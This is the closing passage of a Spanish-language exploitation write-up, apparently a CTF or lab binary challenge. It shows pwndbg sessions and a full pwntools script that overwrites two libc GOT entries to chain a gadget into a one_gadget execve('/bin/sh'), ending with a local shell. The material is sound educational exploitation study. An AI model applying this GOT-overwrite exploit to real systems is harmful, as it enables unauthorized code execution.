+=></span><span class="az"> 0x7b6dec8ebd03</span><span class="p"> &lt</span><span class="am">__execvpe</span><span class="p">+1155>:</span><span class="ve">	call</span><span class="az">   0x7b6dec8eb0f0 </span><span class="p">&lt</span><span class="am">execve</span><span class="p">>
+</span><span class="ro">pwndbg></span><span class="p"> x/s $rdi
+</span><span class="az">0x7b6dec9d8698</span><span class="p">:	"/bin/sh"
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rsi
+</span><span class="az">$1</span><span class="p"> = 0x0
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rdx
+</span><span class="az">$2</span><span class="p"> = 0x33
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar otros registros para hacer un <code class="language-plaintext highlighter-rouge">mov</code> y establecer <code class="language-plaintext highlighter-rouge">rdx</code> a <code class="language-plaintext highlighter-rouge">NULL</code>, sabemos que <code class="language-plaintext highlighter-rouge">rsi</code> está en <code class="language-plaintext highlighter-rouge">0</code> pero también <code class="language-plaintext highlighter-rouge">r12</code> lo está, asi que podriamos aprovecharlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> p/x $r12  
+</span><span class="az">$3</span><span class="p"> = 0x0
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para explotarlo podemos usar un gadget en el offset <code class="language-plaintext highlighter-rouge">0x88630</code> el cual mueve a <code class="language-plaintext highlighter-rouge">rdx</code> lo que se encuentra en <code class="language-plaintext highlighter-rouge">r12</code>, luego de ello hace una llamada que termina en la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">__mempcpy_evex_unaligned_erms</code> encontrada en el offset <code class="language-plaintext highlighter-rouge">0x219040</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/2i 0x74e381000000 + 0x88630
+   </span><span class="az">0x74e381088630</span><span class="p"> &lt</span><span class="am">_IO_obstack_xsputn</span><span class="p">+160>:	   </span><span class="ve">mov</span><span class="ro">    rdx</span><span class="p">,</span><span class="ro">r12</span><span class="p">
+   </span><span class="az">0x74e381088633</span><span class="p"> &lt</span><span class="am">_IO_obstack_xsputn</span><span class="p">+163>:	   </span><span class="ve">call</span><span class="az">   0x74e3810283e0</span><span class="p"> &lt</span><span class="am">*ABS*+0xa9850@plt</span><span class="p">>
+</span><span class="ro">pwndbg></span><span class="p"> x/2i 0x74e3810283e0
+   </span><span class="az">0x74e3810283e0</span><span class="p"> &lt</span><span class="am">*ABS*+0xa9850@plt</span><span class="p">>:</span><span class="ve">      endbr64</span><span class="p">
+   </span><span class="az">0x74e3810283e4</span><span class="p"> &lt</span><span class="am">*ABS*+0xa9850@plt</span><span class="p">+4>:</span><span class="ve">    bnd jmp</span><span class="p"> QWORD PTR [</span><span class="ro">rip</span><span class="p">+</span><span class="az">0x1f0c55</span><span class="p">]</span><span class="c1">        # 0x74e381219040 &lt*ABS*@got.plt>  </span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/gx 0x74e381219040
+</span><span class="az">0x74e381219040</span><span class="p"> &lt</span><span class="am">*ABS*@got.plt</span><span class="p">>:	0x000074e3811aef00
+</span><span class="ro">pwndbg></span><span class="p"> x/i 0x000074e3811aef00
+   </span><span class="az">0x74e3811aef00 </span><span class="p">&lt</span><span class="am">__mempcpy_evex_unaligned_erms</span><span class="p">>:</span><span class="ve">	endbr64</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x74e381219040 - 0x74e381000000
+</span><span class="az">$1</span><span class="p"> = 0x219040
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el exploit el primer write ejecutará un <code class="language-plaintext highlighter-rouge">mov rdx, r12</code> y hace una llamada a la entrada <code class="language-plaintext highlighter-rouge">got</code> de <code class="language-plaintext highlighter-rouge">memcpy</code>, el segundo write lo haremos a la entrada <code class="language-plaintext highlighter-rouge">got</code> de <code class="language-plaintext highlighter-rouge">memcpy</code> y será el <code class="language-plaintext highlighter-rouge">one_gadget</code> que se ejecutará en la llamada y deberia devolver una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn</span><span class="o"> import</span><span class="p"> process, p64
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./ddd"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+libc_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219098</span><span class="p">).encode()) </span><span class="c1"># __strlen_evex@got</span><span class="p">
+shell.sendafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x88630</span><span class="p">))</span><span class="c1">                # mov rdx, r12; call __mempcpy_evex_unaligned_erms@got  </span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219040</span><span class="p">).encode()) </span><span class="c1"># __mempcpy_evex_unaligned_erms@got</span><span class="p">
+shell.sendafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, p64(libc_base</span><span class="o"> +</span><span class="mi"> 0xebcf8</span><span class="p">))</span><span class="c1">                # execve("/bin/sh", rsi, rdx);</span><span class="p">
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit escribe en las <code class="language-plaintext highlighter-rouge">2</code> entradas <code class="language-plaintext highlighter-rouge">got</code> y el <code class="language-plaintext highlighter-rouge">one_gadget</code> devuelve la shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './ddd': pid 75905
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$</span><span class="p"> id
+uid=1000(user) gid=1000(user) groups=1000(user)  
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
